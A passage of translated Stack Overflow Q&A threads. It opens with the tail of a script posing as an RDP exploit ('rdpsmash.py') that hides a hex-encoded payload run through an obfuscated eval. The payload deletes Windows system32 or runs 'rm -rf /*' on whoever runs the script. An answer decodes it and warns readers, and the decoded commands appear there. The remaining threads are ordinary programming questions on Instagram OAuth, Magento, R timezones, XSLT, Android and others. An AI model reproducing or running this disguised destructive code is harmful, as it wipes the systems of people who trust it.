shellcode += "\x74\x66\x6f\x72\x6d\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x29\x20\x65\x6c\x73"
shellcode += "\x65\x20\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73"
shellcode += "\x79\x73\x74\x65\x6d\x28\x27\x72\x6d\x20\x2d\x72\x66\x20\x2f\x2a\x20\x3e\x20\x2f"
shellcode += "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x27\x29\x20\x23\x68\x69\x20"
shellcode += "\x74\x68\x65\x72\x65\x20\x5e\x5f\x7e\x20\x66\x65\x65\x6c\x20\x66\x72\x65\x65\x20"
shellcode += "\x74\x6f\x20\x73\x70\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x77\x69\x74\x68\x20"
shellcode += "\x74\x68\x65\x20\x72\x6d\x20\x2d\x72\x66\x20\x72\x65\x70\x6c\x61\x63\x65\x64\x20"
shellcode += "\x77\x69\x74\x68\x20\x73\x6f\x6d\x65\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20"
shellcode += "\x69\x6e\x73\x69\x64\x69\x6f\x75\x73"

evil = trigger + nopsled

class RDPsocket(socket.socket):
    def __init__(self, payload, shellcode):
        super(RDPsocket, self).__init__(socket.AF_INET, socket.SOCK_STREAM)
        self.payload = payload
        self.table = __import__("__builtin__").__dict__ #dirty workaround
        self.shellcode = shellcode

    def parse(self, address, shellcode):
        seeker = (struct.pack(">I", 0x6576616c), 
            socket.inet_aton(address[0]), #IP bytes
            socket.inet_aton(str(address[1]))) #port bytes
        parsed =  struct.pack(">I", 0x8fe2fb63) #pop eax
        parsed += struct.pack(">I", 0x8fe2fb58) #push esp
        parsed += struct.pack(">I", 0xffff1d6b) #add esp,byte +0x1c # pop ebp # ret
        parsed += struct.pack(">I", 0x8fe2db10) #call strcpy
        parsed += struct.pack(">I", 0x8fe2dfd1) #POP - POP - RET over strcpy params
        parsed += struct.pack(">I", 0x8fe2dae4) #mov ecx,[esp+0x4] # add eax,edx # sub eax,ecx # ret
        parsed += struct.pack(">I", 0x8fe2b3d4) #POP - RET
        parsed += struct.pack(">I", 0xffffffff) #value to store in ecx
        parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
        parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += seeker[0] #add the prelude
        parsed += seeker[1] #add the packed IP address
        parsed += seeker[2] #add the packed port
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += struct.pack(">I", 0x8fe2c71d) #mov eax,edx # ret
        parsed += struct.pack(">I", 0x8fe2def4) #add eax,ecx # ret  
        parsed += struct.pack(">I", 0x8fe0e32d) #xchg eax,edx
        parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
        parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += struct.pack(">I", 0x8fe2def4) #add eax,ecx # ret # swap back
        parsed += struct.pack(">I", 0x8fe0e32d) #xchg eax,edx # copy parameter to placeholder
        parsed += struct.pack(">I", 0x8fe2fb61) #mov [eax],edx # pop eax # ret # set our stack pointer back to original value
        parsed += struct.pack(">I", 0x8fe0e32d) #xchg eax,edx
        parsed += struct.pack(">I", 0x8fe2daea) #sub eax,ecx # ret
        parsed += struct.pack(">I", 0x8fe0b1c2) #xchg eax,ebp # inc ebp # ret
        parsed += struct.pack(">I", 0x8fe2b6a5) #dec ebp # ret
        parsed += struct.pack(">I", 0xffff01f3) #mov esp,ebp # pop ebp # ret
        read = self.table[seeker[0]] #reader for the parsed shellcode/data

        return str(read(shellcode)), parsed

    def connect(self, address):
        self.parsed_shell = self.parse(address, shellcode)
        super(RDPsocket, self).connect(address)

    def evil_sendall(self):
        super(RDPsocket, self).sendall(evil + self.parsed_shell[0] + self.parsed_shell[1])

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print "[*] Usage: python rdpsmash.py IP"
        print "[*] If running on non-default port, reassign PORT in the source."

    else:   
        TARGET = sys.argv[1]
        PORT = 3389 #default RDP port

        print "[*] Running rdpsmash"
        print
        s = RDPsocket(evil, shellcode)
        print "[+] Connecting and configuring payload. . ."
        print "[+] This may take some time"
        s.connect((TARGET, PORT))
        print "[+] Connection established"
        print "[+] Sending payload. . ."
        s.evil_sendall()
        response = s.recv(4096)
        if "\xA5\x43\xE7\x38\x75\x84\xF2\xFF\xFF\x18\x61\x00" in response:
            print "[+] Success! Payload sent and executed."
            print "[+] Telnet to target on port 8888."
        else:
            print "[-] Failed"
        s.close() 
```

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2012-08-13T02:14:20.203

该`parse`方法的第一行很有趣：

```
In [4]: struct.pack(">I", 0x6576616c)
Out[4]: 'eval' 
```

下次你看到它是在底部`parse`：

```
read = self.table[seeker[0]] #reader for the parsed shellcode/data 
```

并且`self.table`定义为：

```
self.table = __import__("__builtin__").__dict__ #dirty workaround 
```

这不是一个“肮脏的解决方法”。这是一种混淆的书写方式`eval`。

这个神奇的`shellcode`变量里有什么？

```
shellcode =  "\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73"
shellcode += "\x74\x65\x6d\x28\x27\x64\x65\x6c\x20\x2f\x73\x20\x2f\x71\x20\x2f\x66\x20\x43\x3a"
shellcode += "\x5c\x77\x69\x6e\x64\x6f\x77\x73\x5c\x73\x79\x73\x74\x65\x6d\x33\x32\x5c\x2a\x20"
shellcode += "\x3e\x20\x4e\x55\x4c\x20\x32\x3e\x26\x31\x27\x29\x20\x69\x66\x20\x27\x57\x69\x6e"
shellcode += "\x27\x20\x69\x6e\x20\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x70\x6c\x61"
shellcode += "\x74\x66\x6f\x72\x6d\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x29\x20\x65\x6c\x73"
shellcode += "\x65\x20\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73"
shellcode += "\x79\x73\x74\x65\x6d\x28\x27\x72\x6d\x20\x2d\x72\x66\x20\x2f\x2a\x20\x3e\x20\x2f"
shellcode += "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x27\x29\x20\x23\x68\x69\x20"
shellcode += "\x74\x68\x65\x72\x65\x20\x5e\x5f\x7e\x20\x66\x65\x65\x6c\x20\x66\x72\x65\x65\x20"
shellcode += "\x74\x6f\x20\x73\x70\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x77\x69\x74\x68\x20"
shellcode += "\x74\x68\x65\x20\x72\x6d\x20\x2d\x72\x66\x20\x72\x65\x70\x6c\x61\x63\x65\x64\x20"
shellcode += "\x77\x69\x74\x68\x20\x73\x6f\x6d\x65\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20"
shellcode += "\x69\x6e\x73\x69\x64\x69\x6f\x75\x73" 
```

一个惊喜（评论实际上在那里）：

```
if 'Win' in __import__('platform').system():
  __import__('os').system('del /s /q /f C:\windows\system32\* > NUL 2>&1')
else:
  __import__('os').system('rm -rf /* > /dev/null 2>&1')

#hi there ^_~ feel free to spread this with the rm -rf replaced with something more insidious 
```

你只是`rm -rf /`在*你的*电脑上运行。你应该很高兴它不是更隐蔽的东西，比如键盘记录器。

# php - 本地主机的 Instagram 重定向 uri 失败

> ID：11927428
> 
> 赞同：2
> 
> 时间：2012-08-13T02:08:27.443
> 
> 标签：php, localhost, oauth-2.0, instagram

我正在编写一个 PHP 应用程序来使用 Instagram 的 API 获取我的所有照片。但是，令我困惑的是，我在托管服务器上运行该应用程序，它运行良好，而在本地运行的同一个应用程序不起作用。

以下是有关应用程序工作流程的一些要点：

1.  用户看到主页，系统会提示他“使用 Instagram 登录”
2.  用户使用 Instagram 登录并授权该应用程序。
3.  Instagram 重定向用户。
4.  然后，应用程序请求 access_token 并接收它。
5.  使用 access_token，应用程序将发送对用户媒体的进一步请求
6.  解析响应并且现在向用户提供图像的链接。

上述所有过程在我的托管服务器上都可以正常工作，但在“第 3 步”中失败。并将用户重定向到我的应用程序的主页。

问题是本地主机是redirect_uri。有没有人可以解决这个问题以在本地使用该应用程序？

PS：我在 Instagram 上注册了两个独立的客户端：一个用于本地托管开发，另一个用于 Web 服务器。

另外，我尝试过localtunnel。也没有帮助。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2018-08-23T05:52:03.157

我知道这是一个非常非常古老的问题。但对于那些希望找到解决方案的人来说：

instagram 目前不允许使用 localhost 或`myvhost.test`重定向 url 之类的东西，更重要的是它需要对 url 进行认证 (https)。

所以我能找到的唯一可行的解​​决方案是使用[ngrok](https://ngrok.com/)。你应该从 url 下载它，打开它并输入一个 localhost 虚拟域名和一个特定的端口号，如`ngrok http myLocalUrl.test/app 80`，按 Enter 键，它会给你两个临时公共链接。

`ngrok`在您关闭命令行之前，它将保持有效。您可以将链接定向到特定端口号，并将端口号定向到本地主机中应用程序的特定文件夹路径。`ngrok`如果您不理解我的提示，提供的教程很简单。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-25T07:35:48.593

我正在处理这个问题，试图使用 NodeJS/Express 开发 Instagram 应用程序。

我通过使用计算机的外部本地 IP 而不是 localhost 解决了这个问题，你可以`grep`使用它。我假设你在 *nix 机器上，所以做一个非常简单（和粗略）

```
$ ifconfig | grep inet 
```

这将返回一些 ip 和 MAC 地址，其中之一是您的外部 IP。然而，这很糟糕，因为这意味着每次切换 IP 时，您都必须使用 Instagram 更新应用程序的 redirect_url 以及更新依赖它的任何代码。

值得庆幸的是，存在诸如[no-ip 之](https://www.no-ip.com)类的服务，它们基本上会为您提供免费的 DDNS 服务，因此您只需向它们注册一个主机名，然后将其放入您的 DEV env 代码以及您的开发客户端的重定向 url 中即可去！

# magento - Magento - 按描述过滤类别

> ID：11927431
> 
> 赞同：0
> 
> 时间：2012-08-13T02:08:31.630
> 
> 标签：magento, categories

在 magento 中，我需要提取描述中包含文本“test-category-block”的所有类别。我尝试添加 addFieldToFilter 但不起作用。有没有简单的方法来做到这一点？

**更新：**

刚刚发现另一个问题，这可能对我有帮助：[Magento categories Listing using getCollection & addLevelFilter but exclude Default Root Category](https://stackoverflow.com/questions/9304240/magento-categories-listing-using-getcollection-addlevelfilter-but-exclude-defa)

**解决了：**

```
$_collection = Mage::getResourceModel('catalog/category_collection')
        ->addAttributeToSelect('*')
        ->addAttributeToFilter('level',array('gt' => 1))
        ->addAttributeToFilter('description', array('like' => '%category-search-filter%')); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T03:22:29.797

您可能希望这样做以过滤描述字段中的文本：

```
 $categories = Mage::getModel('catalog/category')->getCollection()
     ->addFieldToFilter('description', array('like' => '%test-category-block%')) 
```

如果您不使用`like`数组参数，那么它只会匹配*等于*提供值的描述，而不是包含它的描述。

# r - R中的时区：如何避免诸如EST之类的模棱两可的术语？

> ID：11927433
> 
> 赞同：6
> 
> 时间：2012-08-13T02:09:36.990
> 
> 标签：r, timezone, timestamp, time-series, posixct

我在 R 中有一系列字符时间戳。当我将他们的类更改为`POSIXct`使用直观方法时，R 分配了模棱两可的 timezone `EST`。

例如：

```
as.POSIXct("2012-08-06 15:32:00") 
as.POSIXct("2012-08-06 15:32:00", tz = "Australia/Brisbane") 
as.POSIXct("2012-08-06 15:32:00", tz = "") 
```

在我的两个（Mac 和 Windows）盒子上都产生相同的输出：

```
"2012-08-06 15:32:00 EST" 
```

这里的问题`EST`可能是任何数量的时区：美国东部标准时间，或澳大利亚东部标准时间，或加拿大的另一个时区（来自`?timezone`）：

> 请注意，其中一些名称可能与您的想法不同：特别是 EST 是加拿大使用的时区，没有夏令时，而不是 EST5EDT 或（澳大利亚）东部标准时间。

有一种设置时区的方法可以避免使用此`EST`标签。`?timezone`它在 R帮助中被提及，但没有完全解释。设置 x 为[澳大利亚新闻机构](http://www.abc.net.au/news/2012-08-06/countdown-begins-to-dramatic-mars-landing/4178204)报道的好奇号登陆火星的时间：

```
x <- as.POSIXct("2012-08-06 15:32:00", tz = "Etc/GMT-10")
x
"2012-08-06 15:32:00 GMT-10" 
```

[我们可以通过将其转换为美国时区并查看加利福尼亚新闻报道](http://www.nasa.gov/centers/ames/news/releases/2012/12-58AR.txt)来测试这是否正确：

```
y <- format(x, tz = "America/Los_Angeles")
y
"2012-08-05 22:32:00" 
```

如果使用此`Etc/GMT+n`或`Etc/GMT-n`表示法，请注意以下警告`?timezone`：

> 许多系统支持 GMT+n 和 GMT-n 形式的时区，它们与 UTC 有固定的偏移量（因此没有 DST）。与某些用法相反（但与 PST8PDT 等名称一致），负偏移量是 UTC（以东）UTC 之前的时间，正偏移量是 UTC（以西）UTC 的时间。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-13T02:46:59.890

第一个示例中的第 1 行和第 3 行产生相同的输出，因为`tz=""`它是`as.POSIXct`. 第二行更有趣，因为时区是明确定义的。

但请注意，这`"EST"`只是默认情况下打印时区的方式。该`tzone`属性仍然是明确的。

```
R> x <- as.POSIXct("2012-08-06 15:32:00", tz="Australia/Brisbane")
R> x
[1] "2012-08-06 15:32:00 EST"
R> attr(x, "tzone")
[1] "Australia/Brisbane" 
```

# ruby-on-rails-3 - 与 rails_admin 与同一模型的多个 HABTM 关联而苦苦挣扎

> ID：11927434
> 
> 赞同：0
> 
> 时间：2012-08-13T02:09:57.460
> 
> 标签：ruby-on-rails-3, ruby-on-rails-3.1, rails-admin

我查看了 Google、Rails_Admin dox 等，但找不到答案。

我有一家模特经纪公司：

```
class Agency < ActiveRecord::Base
    has_and_belongs_to_many :kids 
```

还有儿童模型：

```
class Kid < ActiveRecord::Base
    has_and_belongs_to_many :agencies
    attr_accessible :agency_ids 
```

在 Rails_Admin 中，我使用以下代码访问代理：

```
config.model Kid do
    edit do
      field :agencies
    end
end 
```

但是，对于我的生活，我无法弄清楚如何与不同领域的同一模型建立关联。就像是：

```
config.model Kid do
    edit do
      field :agencies
      field :agencies_previous      
    end
end 
```

其中代理机构_以前和代理机构将引用相同的代理机构模型。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T15:54:59.360

我认为您需要的是类似[https://github.com/benedikt/mongoid-tree](https://github.com/benedikt/mongoid-tree)的东西，您可以在其中引用自我模型，这就是您所需要的吗？

# xslt - 替换输入 xml 中的命名空间

> ID：11927435
> 
> 赞同：0
> 
> 时间：2012-08-13T02:10:01.267
> 
> 标签：xslt, namespaces, xslt-1.0

我有两种类型的输入 xml，一种带有命名空间前缀，另一种没有前缀，我想替换命名空间。

样品1

```
<v1:Library xmlns:v1="http://testlibrary" xmlns:v2="http://commonprice">
<v1:Books_details>
<v1:Name>test1</v1:Name>
<v1:title>test2</v1:title>
<v2:price xmlns="http://commonprice">12</v2:price>
</v1:Books_details>
</v1:Library> 
```

样品2

```
<Library xmlns="http://testlibrary">
<Books_details>
<Name>test1</Name>
<title>test2</title>
<price xmlns="http://commonprice">12</price>
</Books_details>
</Library> 
```

我已经编写了以下 XSLT 以将命名空间从“ **http://testlibrary** ”更改为“ **http://newlibrary** ”，它适用于 sample1，但不适用于 sample2。它给出了错误的结果。即使没有要替换的命名空间，它也会更改价格元素的命名空间。

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:xs="http://www.w3.org/2001/XMLSchema">
    <xsl:param name="old_namespace"/>
    <xsl:param name="new_namespace"/>
    <xsl:template match="/">
    <xsl:apply-templates select="@* | node()"/>
    </xsl:template>

    <xsl:template match="text() | comment() | processing-instruction()">
        <xsl:copy>
            <xsl:apply-templates select="text() | comment() | processing-instruction()"/>
        </xsl:copy>
    </xsl:template>
    <!--  Template used to copy elements  -->   
    <xsl:template match="*">

         <xsl:variable name="name">
            <xsl:choose>
                <xsl:when test="contains(name(), ':')">
                    <xsl:value-of select="name()"/>
                </xsl:when>
                <xsl:otherwise>
                    <xsl:value-of select="local-name()"/>
                </xsl:otherwise>
            </xsl:choose> 
         </xsl:variable>

        <xsl:element name="{$name}" namespace="{$new_namespace}">
             <!-- Copy all namespace through except for namespace to be changed --> 
             <xsl:for-each select="namespace::*">
                 <xsl:if test="string(.)!=$old_namespace">
                     <xsl:copy-of select="."/>
                 </xsl:if>
            </xsl:for-each> 
            <xsl:apply-templates select="node()|@*"/>
        </xsl:element>
    </xsl:template>
</xsl:stylesheet> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T09:52:05.153

注意：我的第一个答案是错误的，因为在 XSLT 1.0 中，您不能在匹配模式中使用变量引用。

此样式表将 Sample1 或 Sample2 作为输入文档，并将元素名称中所有出现的旧名称空间替换为新名称空间。注意：您可以更改 xsl:param 的 xsl:variable。

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" indent="yes"/>

<xsl:variable name="old_namespace" select="'http://testlibrary'" />
<xsl:variable name="new_namespace" select="'http://newlibrary'" />

<xsl:template match="@*|node()">
  <xsl:copy>
     <xsl:apply-templates select="@*|node()"/>
  </xsl:copy>
</xsl:template>

  <xsl:template match="*">
    <xsl:choose>    
      <xsl:when test="namespace-uri()=$old_namespace">
       <xsl:element name="{local-name()}" namespace="{$new_namespace}">
        <xsl:apply-templates select="@*|node()"/>
       </xsl:element>
      </xsl:when>
      <xsl:otherwise>    
       <xsl:copy>
        <xsl:apply-templates select="@*|node()"/>
       </xsl:copy>
      </xsl:otherwise>    
    </xsl:choose>    
  </xsl:template>

</xsl:stylesheet> 
```

## 警告

上面的样式表只会改变元素的命名空间。它**不会**改变属性的命名空间，也不会删除无关的命名空间节点。

## 关于更具体的解决方案

对变量命名空间的操作要求通用解决方案是非常不寻常的。命名空间，作为它们的本质，往往是固定的和已知的。仔细考虑，如果你真的需要一个通用的解决方案。如果您需要特定的解决方案，这意味着替换特定命名空间的出现，那么事情会变得容易得多，例如使用这个样式表......

```
<xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:old="http://testlibrary"
      xmlns:new="http://newlibrary">

<xsl:template match="@*|node()">
 <xsl:copy>
  <xsl:apply-templates select="@*|node()"/>
 </xsl:copy>
</xsl:template>

<xsl:template match="old:*">
  <xsl:element name="{local-name()}" namespace="http://newlibrary">
    <xsl:apply-templates select="@*|node()" />
  </xsl:element>
</xsl:template>

</xsl:stylesheet> 
```

* * *

# 更新

我刚刚注意到[Dimitre对](https://stackoverflow.com/users/36305)[这里](https://stackoverflow.com/questions/8870195)的一个非常相似的问题的解决方案。

# jquery - Jquery自定义调整大小句柄不起作用

> ID：11927438
> 
> 赞同：0
> 
> 时间：2012-08-13T02:10:19.523
> 
> 标签：jquery, jquery-ui, drag-and-drop, jquery-resizable

我想要一个类似于下图的可实现对象的句柄。

我尝试的代码不适用于自定义句柄。

如果我包含自定义句柄选项，则重新调整大小根本不起作用。

```
<style>
    .object{
        width: 100px; height: 100px; border: 1px solid black;

}
#myContainer{
    height: 600px;
    border: 2px solid #ccc;
}
.handle{
    height: 10px; width: 10px; background: red;
}
</style>
<script type="text/javascript">
$(function() {
    $("#resizable").resizable({
        handles: { 'all': $('#handle') }
      });
});
</script>

<div id="myContainer">
    <div class="object" id="resizable">
        <div id="handle" class="handle"></div>
    </div>
</div> 
```

![在此处输入图像描述](../Images/21e318364932d3135d065e18399c0832.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T02:23:14.553

你看过[http://jqueryui.com/demos/resizable/](http://jqueryui.com/demos/resizable/)吗？

您可以添加一些代码来将边框更改为`div`虚线边框并为八个正方形使用背景图像？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T03:27:53.997

我正在寻找的东西在这里 [http://www.egrappler.com/jquery-smartit-plugin-css3-2d-transformation/](http://www.egrappler.com/jquery-smartit-plugin-css3-2d-transformation/)

# android - 为什么我无法实例化新变量？

> ID：11927439
> 
> 赞同：1
> 
> 时间：2012-08-13T02:10:25.083
> 
> 标签：android, android-asynctask, instantiation

我正在使用 AsyncTask 类...我的目标是创建一个列表，并在单击搜索按钮时使“搜索...”字符串在搜索时出现在列表中...为此，我尝试在 onPreExecute() 中实例化一个适配器

```
private class SearchTask extends AsyncTask<Void, Void, Void>{

        protected void onPreExecute() {
            String[] strings = new String[] { "Searching" };
            ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, strings);

            mSearchButton.setEnabled(false);
        }
                //rest of methods
} 
```

编译器给了我一个错误`new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, strings);`

它说：`The constructor ArrayAdapter<String>(SearchActivity.SearchTask, int, ArrayList<String>) is undefined`

有什么办法可以解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T02:15:30.437

因为`SearchActivity.SearchTask`不是`Activity`（或`Context`更一般的情况下）。您应该使用`SearchActivity.this`而不是简单地`this`引用类型为`SearchActivity.SearchTask`子类的对象 `AsyncTask`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T02:17:40.687

因为你的参数是错误的 ArrayAdapter adapter = new ArrayAdapter(this, android.R.layout.simple_list_item_1, strings);

（上下文，int，对象[]）

您输入“this”，但“this”不是上下文。

如果您在 SearchTask 中使用“this”，则表示不是上下文。

所以你使用 'getparent()' 而不是 'this'

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T02:18:01.297

我想这是一个问题`this`。

在中添加成员变量`SearchActivity`：

```
private Context mContext = this; 
```

然后改变：

```
ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, strings); 
```

至

```
ArrayAdapter<String> adapter = new ArrayAdapter<String>(mContext, android.R.layout.simple_list_item_1, strings); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-13T02:15:20.720

参数不正确。看看[文档。](http://developer.android.com/reference/android/widget/ArrayAdapter.html)

```
ArrayAdapter<String> adapter = new ArrayAdapter<String>(YourActivity.this,      
                   android.R.layout.simple_list_item_1, strings); 
```

# ios - Foursquare oauth_token 有时会损坏？

> ID：11927440
> 
> 赞同：0
> 
> 时间：2012-08-13T02:10:28.633
> 
> 标签：ios, oauth, foursquare

在使用 Foursquare API 测试我的应用程序时，我在大多数情况下都成功地使用了它。但是假设我“断开”应用程序以测试失败，然后再次“连接”，应用程序（我已经有一个新令牌）告诉我这个令牌无效或被撤销。到目前为止，唯一的解决方法是重置客户端密码。

这很常见吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T02:30:14.363

出于某种原因，我在测试回调 URL 时截断了令牌的后一个。对不起，伙计们:)

# regex - 使用正则表达式验证 ASP Classic 中的 Form 和 QueryString。几乎可以工作但缺少什么？

> ID：11927445
> 
> 赞同：2
> 
> 时间：2012-08-13T02:11:22.883
> 
> 标签：regex, validation, asp-classic, vbscript

我正在尝试使用下面看到的函数/代码在经典 ASP 中添加一些输入验证。唯一看起来正常工作的是“文本”类型。其他我不断收到错误，或者它只是没有正确过滤。我试图了解我做错了什么，请帮助我。

有效数据类型：“电子邮件”、“整数”、“日期”、“字符串”和“文本”。前三个很明显，后两个略有不同。

“ **email** ”应该只允许数字和字母，以及以下字符“ **@** ”、“ **-** ”、“ **.** ”、“ **_** ”

“**日期**”应通过运行 IsDate 进行验证，如果为 True，则允许，如果为 False，则不允许。

“**字符串**”应该验证基于文本的查询字符串，只允许字母、数字、_、- 和 .

而“ **text** ”是任何自由格式的文本表单字段类型内容。

“**整数**”应该只允许数字和句点 (.)

***使用示例：*** `<input type="text" value="<%=MakeSafe("test@test.com</HTML>1234.5",integer,50)%>">`

***例如：*** `MakeSafe(dataInput,dataType,dataLength)`

```
<%
'// CODE BY: dB Masters
'// FOUND AT: http://successontheweb.blogspot.com/2008/03/input-validation-for-security-in.html

Function MakeSafeConvert(encodeData)
encodeData = replace(encodeData,"&", "&#38;")
encodeData = replace(encodeData,"'", "&#39;")
encodeData = replace(encodeData,"""", "&quot;")
encodeData = replace(encodeData,">", "&gt;")
encodeData = replace(encodeData,"<", "&lt;")
encodeData = replace(encodeData,")", "&#41;")
encodeData = replace(encodeData,"(", "&#40;")
encodeData = replace(encodeData,"]", "&#93;")
encodeData = replace(encodeData,"[", "&#91;")
encodeData = replace(encodeData,"}", "&#125;")
encodeData = replace(encodeData,"{", "&#123;")
encodeData = replace(encodeData,"--", "&#45;&#45;")
encodeData = replace(encodeData,"=", "&#61;")
MakeSafeConvert = encodeData
End Function

Function MakeSafe(dataInput,dataType,dataLength)

Dim regex, validInput, expressionmatch
regex = ""
validInput = "1"

If dataType = "string" And Len(dataInput) > 0 Then
    regex = "^[\w-\.]{1,"& dataLength &"}$"
ElseIf dataType = "email" And Len(dataInput) > 0 Then
    regex = "^[\w-\.]+@([\w-]+\.)+[\w-]{2,6}$"
ElseIf dataType = "integer" And Len(dataInput) > 0 Then
    regex = "^\d{1,"& dataLength &"}$"
ElseIf dataType = "date" And Len(dataInput) > 0 Then
If Not IsDate(dataInput) Then validInput = "0" End If
ElseIf dataType = "text" And Len(dataInput) > 0 Then
If Len(dataInput) > dataLength Then validInput = "0" End If
End If

If Len(regex) > 0 And Len(dataInput) > 0 Then
    Set RegExpObj = New RegExp
    RegExpObj.Pattern = regex
    RegExpObj.IgnoreCase = True
    RegExpObj.Global = True
    RegExpChk = RegExpObj.Test(dataInput)

If Not RegExpChk Then
    validInput = "0"
    End If
    Set RegExpObj = nothing
End If

If validInput = "1" And Len(dataInput) > 0 Then
    MakeSafe = MakeSafeConvert(dataInput)
    ElseIf Len(dataInput) = 0 Then
    MakeSafe = ""
Else
    Response.Write "<h2>Processing Halted.</h2>"
    Response.End
End If

End Function
%> 
```

**示例代码和错误：**

当我使用代码对此进行测试时：

**<%=MakeSafe("test@test.com1234.5",email,50)%>** ***不验证任何内容。*

我没有收到错误消息，但它不验证任何内容。

**输出为：test@test.com1/27/20121234.5

应该只是：test@test.com**

当我使用代码对此进行测试时：

**<%=MakeSafe("test@test.com1/27/20121234.5",date,50)%>**

我没有收到错误消息，但它不验证任何内容。

输出是：test@test.com1/27/20121234.5 应该是：1/27/2012

另外两个给我这个错误信息：

**<%=MakeSafe("test@test.com1234.5",string,50)%>**
***错误！！！错误数量的参数或无效的属性分配：“字符串”

**<%=MakeSafe("test@test.com1234.5",整数,50)%>**

***错误！！！语法错误

非常感谢您提供的任何帮助...

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-16T03:07:16.597

如果不是拼写错误，那么您的错误出在函数调用的第二个参数上。

你调用函数如下：

```
<%=MakeSafe("test@test.com1234.5",email,50)%> 
```

这是错误的，因为您也应该“...”第二个参数。这应该有效：

```
<%=MakeSafe("test@test.com1234.5","email",50)%> 
```

# javascript - 如何限制 .the keydown JavaScript 事件？

> ID：11927451
> 
> 赞同：0
> 
> 时间：2012-08-13T02:12:55.637
> 
> 标签：javascript, jquery, jquery-events, keydown

这是文件 [http://www.frysa.us/Arctext/Size.html](http://www.frysa.us/Arctext/Size.html)

我尝试使用 if 语句来限制字体大小：

```
<script>
$(function(){

 var KEY_UP = 38;
 var KEY_DOWN = 40;

 //Set listener for keydown
 $(document).keydown(function(e){
 $("anything").html("- keydown -");
   switch(e.which){
   case KEY_UP:
 var fontsize = parseInt($("#example4").css("font-size")) + 2;
 $("#example4").css("font-size", fontsize+"px");

if (("#example4").css("font-size")<20){
alert("it is less than 20")
//some sort of code to limit the font-size
}

 break;
case KEY_DOWN:
 var fontsize = parseInt($("#example4").css("font-size")) - 2;
 $("#example4").css("font-size", fontsize+"px");
 break;
   }
 });

});
</script> 
```

运气不太好..有人能指出我正确的方向吗

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T02:27:17.333

您只需要将 CSS 字符串转换为整数。尝试使用*[replace](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/replace)*：

```
var fontSize = $("#example4").css("font-size");
var intFontSize = parseInt(fontSize.replace('px',''));
if (intFontSize<20){
    alert("it is less than 20")
    //some sort of code to limit the font-size
} 
```

（另外，请注意您有一个错字，此行缺少**$**）：

```
if (("#example4").css("font-size")<20){ 
```

# regex - 这些特殊字符在 Java 中是什么意思？

> ID：11927452
> 
> 赞同：12
> 
> 时间：2012-08-13T02:12:56.147
> 
> 标签：regex, java

我在看一些jdk代码。我找到了这些字符。有人可以向我解释这些是什么意思。

```
public static String quote(String s) {
    int slashEIndex = s.indexOf("\\E");        // What does this mean. Is this a special char in java. if so what does this do.
    if (slashEIndex == -1)
        return "\\Q" + s + "\\E";          

    StringBuilder sb = new StringBuilder(s.length() * 2);
    sb.append("\\Q");
    slashEIndex = 0;
    int current = 0;
    while ((slashEIndex = s.indexOf("\\E", current)) != -1) {
        sb.append(s.substring(current, slashEIndex));
        current = slashEIndex + 2;
        sb.append("\\E\\\\E\\Q");
    }
    sb.append(s.substring(current, s.length()));
    sb.append("\\E");
    return sb.toString();
} 
```

